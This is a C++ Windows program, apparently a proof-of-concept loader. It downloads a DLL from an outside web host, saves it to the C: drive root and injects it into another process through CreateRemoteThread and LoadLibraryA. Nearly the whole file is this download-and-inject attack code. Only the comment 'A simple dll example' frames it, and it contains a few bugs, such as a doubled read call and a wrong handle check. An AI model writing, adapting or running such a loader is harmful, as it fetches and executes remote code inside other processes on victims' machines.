#include <iostream>
#include <Windows.h>
#include <string>
#include "Shlwapi.h"
#include "process_actions.h"
#include "getlast_error.h"
#include <WinInet.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Wininet.lib")
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

//A simple dll example

void GetPayload() {
	char* fBuffer = NULL;
	DWORD numberOfBytesRead = 0;
	DWORD nnumberBytesWritten = 0;

	//Get a handle to the useragent 
	HINTERNET iOpen = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (iOpen == NULL) {
		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
	}
	else {
		//if using not relative url use InternetCanonicalizeUrl.
		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "http://brickbullet.com/rmtsrc/testdll.dll", 0, 0, INTERNET_FLAG_RELOAD, 0);
		if (iOpen == NULL) {
			std::cerr << "could not access resource: " << GetLastErrorAsString();
		}
		else {
			//create empty file on disk
			HANDLE hOut = CreateFile(L"C:\\testDll.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hOut == INVALID_HANDLE_VALUE) {
				cerr << "could not create file: " << GetLastErrorAsString() << endl;
			}
			else {
				do {
					fBuffer = new char[2000];
					ZeroMemory(fBuffer, 2000);
					//read the file from the url
					InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead);
					if (!(InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead))) {
						cerr << "error could not read from the file: " << GetLastErrorAsString();
					}
					else {
						//write to the file 
						if (!(WriteFile(hOut, &fBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL))) {
							cerr << "could not write the file" << GetLastErrorAsString();
						}
					}
					//clean up free memory and close handles
					delete[] fBuffer;
					fBuffer = NULL;
				} while (numberOfBytesRead);
				CloseHandle(hOut);
			}
			InternetCloseHandle(iOpen);
			InternetCloseHandle(iRsrc);
		}
	}
	return;
}

int executePayload() {
	WIN32_FIND_DATAA fdata;
	HANDLE findFile = FindFirstFileA("C:\\testDll.dll", &fdata);

	if (findFile == INVALID_HANDLE_VALUE) {
		cerr << "Could not find fild data" << GetLastErrorAsString();
	}
	else {
		std::string pname, dllpath;
		PROCESS_ACTIONS::ProcActions<DWORD> obj;

		const char* p = ""; const char* d = "C:\\testDll.dll";
		if (obj.getProcessIDbyName(p) == 0) {
			cerr << "[ERROR] The process specified was not found." << std::endl;
			
		}
		//Check if the path to the file exists
		if (!PathFileExistsA(d)) {
			cerr << "\n[ERROR] Invalid file path specified." << endl;
		}
		else {
			//open a handle to the target process
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
			if (hProcess == NULL) {
				cerr << "Could not open process" << GetLastErrorAsString();
			}
			else {
				//allocate memory in process, save base address
				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
				if (dllP == NULL) {
					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
				}
				else {
					//write the path to the region allocated
					WriteProcessMemory(hProcess, dllP, (LPVOID)d, strlen(d) + 1, 0);
					HANDLE handleLthd = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), dllP, 0, 0);
					DWORD retVal = WaitForSingleObject(handleLthd, INFINITE);
					if (handleLthd == NULL | retVal == WAIT_FAILED) {
						cerr << "Failed to create remote thread in process." << endl;
						return -1;
					}
					printf("Path allocation address:  0x%08x\n", dllP);
					VirtualFreeEx(hProcess, dllP, strlen(d) + 1, MEM_RELEASE);
				}
			}
		}
		CloseHandle(findFile);
	}
	return 0;
}


int main(int argc, char* argv[])
{
	GetPayload();
	executePayload();
	return 0;
}